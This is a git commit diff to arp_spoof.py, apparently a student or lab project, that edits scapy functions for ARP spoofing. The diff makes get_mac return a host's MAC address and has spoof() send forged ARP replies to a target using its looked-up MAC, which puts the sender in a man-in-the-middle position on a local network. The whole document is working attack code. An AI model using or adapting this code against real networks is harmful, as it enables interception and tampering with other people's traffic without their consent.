06db2335477d3493180d560d7b839ac90d3fabd3
em0ji <roxi.xyz@gmail.com>
2021-10-04 14:38:34 -0400

    Отредактировали функции get_mac и spoof

--- arp_spoof/arp_spoof.py
+++ arp_spoof/arp_spoof.py
@@ -8,16 +8,12 @@ def get_mac(ip):
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-    print(answered_list[0][1].hwsrc)
-    # clients_list = []
-    # for element in answered_list:
-    #     client_dict ={"ip": element[1].psrc, "mac": element[1].hwsrc}
-    #     clients_list.append(client_dict)
-    # return clients_list
+    return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:8a:21:73", psrc=spoof_ip)
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
 get_mac("10.0.2.1")
